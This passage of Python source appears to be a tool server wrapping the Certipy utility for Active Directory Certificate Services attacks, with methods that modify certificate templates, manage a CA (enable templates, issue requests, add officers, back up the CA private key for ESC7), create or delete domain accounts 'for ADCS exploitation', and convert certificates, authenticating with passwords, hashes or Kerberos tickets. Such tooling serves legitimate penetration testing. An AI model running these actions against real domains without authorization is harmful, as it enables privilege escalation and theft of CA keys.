            # action flags produces no output.  Use -save-configuration to dump
            # the template to a JSON file, then return its contents.
            save_name = f"{prefix}_{template}.json"
            cmd.extend(["-save-configuration", save_name])
        elif action == "save_config":
            save_name = f"{prefix}_{template}.json"
            cmd.extend(["-save-configuration", save_name])
        elif action == "write_default":
            cmd.append("-write-default-configuration")
            cmd.append("-force")  # Skip "apply changes?" prompt
            cmd.append("-no-save")  # Skip backup (prevents "file exists, overwrite?" prompt)
        elif action == "write_config":
            cmd.extend(["-write-configuration", config_path])
            cmd.append("-force")  # Skip "apply changes?" prompt
            cmd.append("-no-save")  # Skip backup (prevents "file exists, overwrite?" prompt)

        if extra_args:
            cmd.extend(shlex.split(extra_args))

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            json_files = [f for f in new_files if f.endswith(".json")]

            data = {
                "method": "template",
                "template": template,
                "action": action,
                "output_files": new_files,
            }

            # Parse saved config if available
            if json_files:
                try:
                    with open(json_files[0], "r") as f:
                        config = json.load(f)
                    data["config"] = config
                    data["config_path"] = json_files[0]
                except (json.JSONDecodeError, OSError):
                    data["config_path"] = json_files[0]

            # Detect certipy errors
            certipy_error = self._detect_certipy_error(combined)

            # Additional heuristic: if save_config produced no JSON file, or
            # if the output is just the certipy banner (silent failure on auth),
            # treat as failure. Certipy sometimes exits 0 with no error message.
            silent_failure = False
            if certipy_error is None and action in ("save_config", "read") and not json_files:
                certipy_error = "No configuration saved — certipy may have failed silently. Check credentials and template name."
                silent_failure = True

            is_success = certipy_error is None

            error_class, retryable, suggestions = (None, False, [])
            if not is_success:
                error_class, retryable, suggestions = self._classify_certipy_error(combined)
                # Silent failures (empty output) are almost always auth issues
                if silent_failure and error_class == "unknown":
                    error_class = "auth"
                    retryable = True
                    suggestions = [
                        "Certipy returned no output — likely an authentication failure",
                        "Verify credentials and ensure LDAP connectivity to the DC",
                    ]

            return ToolResult(
                success=is_success,
                data=data,
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))


    async def ca(
        self,
        username: str,
        dc_ip: str,
        ca_name: str,
        enable_template: Optional[str] = None,
        disable_template: Optional[str] = None,
        issue_request: Optional[int] = None,
        deny_request: Optional[int] = None,
        add_officer: Optional[str] = None,
        remove_officer: Optional[str] = None,
        backup: bool = False,
        config: Optional[str] = None,
        list_templates: bool = False,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        extra_args: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Manage Certificate Authority: enable/disable templates, approve/deny requests (ESC7)."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        self._ensure_work_dir()

        cmd = [CERTIPY_BIN, "ca"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-ca", ca_name])

        action_desc = "unknown"
        if enable_template:
            cmd.extend(["-enable-template", enable_template])
            action_desc = f"enable template '{enable_template}'"
        elif disable_template:
            cmd.extend(["-disable-template", disable_template])
            action_desc = f"disable template '{disable_template}'"
        elif issue_request is not None:
            cmd.extend(["-issue-request", str(issue_request)])
            action_desc = f"issue request {issue_request}"
        elif deny_request is not None:
            cmd.extend(["-deny-request", str(deny_request)])
            action_desc = f"deny request {deny_request}"

        if add_officer:
            cmd.extend(["-add-officer", add_officer])
            if action_desc == "unknown":
                action_desc = f"add officer '{add_officer}'"
        if remove_officer:
            cmd.extend(["-remove-officer", remove_officer])
            if action_desc == "unknown":
                action_desc = f"remove officer '{remove_officer}'"
        if backup:
            cmd.append("-backup")
            if action_desc == "unknown":
                action_desc = "backup CA private key"
        if config:
            cmd.extend(["-config", config])
        if list_templates:
            cmd.append("-list-templates")
            if action_desc == "unknown":
                action_desc = "list templates"
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr

            certipy_error = self._detect_certipy_error(combined)

            # Check for success indicators in output
            success_indicators = [
                "Successfully enabled",
                "Successfully disabled",
                "Successfully issued",
                "Successfully denied",
                "Successfully added",
                "Successfully removed",
                "approved",
            ]
            has_success = any(ind.lower() in combined.lower() for ind in success_indicators)
            is_success = (certipy_error is None and result.returncode == 0) or has_success

            error_class, retryable, suggestions = (None, False, [])
            if not is_success:
                error_class, retryable, suggestions = self._classify_certipy_error(combined)

            return ToolResult(
                success=is_success,
                data={
                    "method": "ca",
                    "ca_name": ca_name,
                    "action": action_desc,
                    "enable_template": enable_template,
                    "disable_template": disable_template,
                    "issue_request": issue_request,
                    "deny_request": deny_request,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def account(
        self,
        username: str,
        dc_ip: str,
        user: str,
        action: str = "read",
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        group: Optional[str] = None,
        account_dns: Optional[str] = None,
        upn: Optional[str] = None,
        sam: Optional[str] = None,
        spns: Optional[str] = None,
        account_pass: Optional[str] = None,
        extra_args: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Create, read, update, or delete AD accounts for ADCS exploitation."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        self._ensure_work_dir()

        cmd = [CERTIPY_BIN, "account"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-user", user])

        if group:
            cmd.extend(["-group", group])
        if account_dns:
            cmd.extend(["-dns", account_dns])
        if upn:
            cmd.extend(["-upn", upn])
        if sam:
            cmd.extend(["-sam", sam])
        if spns:
            cmd.extend(["-spns", spns])
        if account_pass:
            cmd.extend(["-pass", account_pass])
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        # Action is a positional argument (create/read/update/delete)
        cmd.append(action)

        # Certipy's delete action prompts "Are you sure? (y/N):" on stdin.
        # Since run_command_with_progress uses stdin=DEVNULL, the prompt gets
        # EOF and the command aborts.  Wrap with `yes` to auto-confirm.
        if action == "delete":
            cmd = ["bash", "-c", "yes | " + " ".join(shlex.quote(c) for c in cmd)]

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command_with_progress(cmd, env=auth_env)
            combined = result.stdout + result.stderr

            certipy_error = self._detect_certipy_error(combined)
            is_success = certipy_error is None and result.returncode == 0

            error_class, retryable, suggestions = (None, False, [])
            if not is_success:
                if certipy_error:
                    error_class, retryable, suggestions = self._classify_certipy_error(combined)
                else:
                    certipy_error = f"Account {action} failed -- check output for details"

            return ToolResult(
                success=is_success,
                data={
                    "method": "account",
                    "action": action,
                    "user": user,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def cert(
        self,
        pfx_path: Optional[str] = None,
        pfx_password: Optional[str] = None,
        key_path: Optional[str] = None,
        cert_path: Optional[str] = None,
        export: bool = False,
        out: Optional[str] = None,
        nocert: bool = False,
        nokey: bool = False,
        export_password: Optional[str] = None,
        extra_args: Optional[str] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Convert between certificate formats — extract PEM from PFX, combine key+cert into PFX."""
        if not pfx_path and not key_path and not cert_path:
            return ToolResult(
                success=False,
                error="Must specify at least one input: pfx_path, key_path, or cert_path.",
            )

        # Validate input files exist
        for path, label in [(pfx_path, "PFX"), (key_path, "key"), (cert_path, "cert")]:
            if path and not os.path.isfile(path):
                return ToolResult(
                    success=False,
                    error=f"{label} file not found: {path}",
                )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "cert"]

        if pfx_path:
            cmd.extend(["-pfx", pfx_path])
        if pfx_password:
            cmd.extend(["-password", pfx_password])
        if key_path:
            cmd.extend(["-key", key_path])
        if cert_path:
            cmd.extend(["-cert", cert_path])
        if export:
            cmd.append("-export")

        # Auto-generate output path if none specified.  Without -out,
        # certipy cert prints PEM to stdout which we'd only capture in
        # raw_output — not very useful for downstream tools.
        if out:
            cmd.extend(["-out", out])
        elif not export:
            # Determine a sensible filename
            input_name = os.path.splitext(os.path.basename(
                pfx_path or key_path or cert_path or "cert"))[0]
            auto_out = os.path.join(WORK_DIR, f"{prefix}_{input_name}.pem")
            cmd.extend(["-out", auto_out])

        if nocert:
            cmd.append("-nocert")
        if nokey:
            cmd.append("-nokey")
        if export_password:
            cmd.extend(["-export-password", export_password])
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        combined = ""
        try:
            result = await self.run_command_with_progress(cmd)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)

            is_success = result.returncode == 0
            error_msg = None
            if not is_success:
                error_msg = self._detect_certipy_error(combined) or "Certificate conversion failed"

            return ToolResult(
                success=is_success,
                data={
                    "method": "cert",
                    "output_files": new_files,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def parse(
        self,
        input_file: str,
        format: str = "bof",
        domain: Optional[str] = None,
        ca_name: Optional[str] = None,
        sids: Optional[str] = None,
        published: Optional[str] = None,
        vulnerable: bool = False,
        enabled: bool = False,
        hide_admins: bool = False,
        output_stdout: bool = False,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Offline ADCS analysis — parse BOF output or registry exports."""
        if not os.path.isfile(input_file):
            return ToolResult(
                success=False,
                error=f"Input file not found: {input_file}",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "parse"]

        # Output options — always produce JSON + text
        cmd.extend(["-json", "-text"])
        cmd.extend(["-output", prefix])

        if format != "bof":
            cmd.extend(["-format", format])
        if domain:
            cmd.extend(["-domain", domain])
        if ca_name:
            cmd.extend(["-ca", ca_name])
        if sids:
            cmd.extend(["-sids", sids])
        if published:
            cmd.extend(["-published", published])
        if vulnerable:
            cmd.append("-vulnerable")
        if enabled:
            cmd.append("-enabled")
        if hide_admins:
            cmd.append("-hide-admins")
        if output_stdout:
            cmd.append("-stdout")
        if extra_args:
            cmd.extend(shlex.split(extra_args))

        # Input file is a positional argument
        cmd.append(input_file)

        combined = ""
        try:
            result = await self.run_command_with_progress(cmd)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            json_files = [f for f in new_files if f.endswith(".json")]
            text_files = [f for f in new_files if f.endswith(".txt")]

            # Parse JSON if available (same format as find)
            parsed = {}
            if json_files:
                parsed = self._parse_find_json(json_files)

            is_success = result.returncode == 0
            error_msg = None
            if not is_success:
                error_msg = self._detect_certipy_error(combined) or "Parse failed -- check input file format"

            return ToolResult(
                success=is_success,
                data={
                    "method": "parse",
                    "input_file": input_file,
                    "format": format,
                    "output_files": new_files,
                    "json_file": json_files[0] if json_files else None,
                    "text_file": text_files[0] if text_files else None,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))


if __name__ == "__main__":
    CertipyServer.main()
